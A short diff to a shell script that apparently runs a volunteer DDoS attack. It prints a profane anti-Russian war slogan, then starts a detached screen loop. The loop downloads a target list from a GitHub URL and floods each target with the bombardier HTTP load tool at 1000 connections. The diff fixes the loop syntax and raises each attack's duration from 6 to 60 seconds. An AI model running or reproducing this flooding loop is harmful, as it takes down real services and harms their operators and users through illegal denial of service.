@@ -639,11 +639,13 @@ fi
 
 echo "Русский корабль, иди нахуй! Можно отсоединяться, дальше я сам :)"
 screen -dm bash -c '
-while true do
+while true
+do
 	curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list > /tmp/list
 	while read p; do
 	  echo "$p"
-	  docker run -i alpine/bombardier -c 1000 -d 6s -l "$p"
+	  docker run -i alpine/bombardier -c 1000 -d 60s -l "$p"
 	  sleep 1;
 	done < /tmp/list
-done'
+done
+'
